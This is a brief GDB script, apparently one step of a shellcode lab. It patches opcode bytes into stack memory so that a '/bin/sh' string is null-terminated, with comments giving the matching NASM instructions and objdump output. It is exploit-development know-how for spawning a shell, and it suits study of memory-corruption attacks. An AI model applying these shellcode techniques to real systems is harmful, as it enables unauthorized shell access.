
# mods for step 5
# null after "/bin/sh" so we get a null term string

# nasm
# ; Add code to add null byte for term to "/bin/sh"
# sub     eax, 5
# mov    [eax], bl
  
# objdump
#   9:   83 e8 05                sub    $0x5,%eax
#   c:   88 18                   mov    %bl,(%eax)

# of our older existing code
set var *((unsigned char *) 0xbffff349) = 0x83
set var *((unsigned char *) 0xbffff34a) = 0xe8
set var *((unsigned char *) 0xbffff34b) = 0x05
set var *((unsigned char *) 0xbffff34c) = 0x88
set var *((unsigned char *) 0xbffff34d) = 0x18
# write junk at null byte to verify our code works.
set var *((unsigned char *) 0xbffff37b) = 0x33
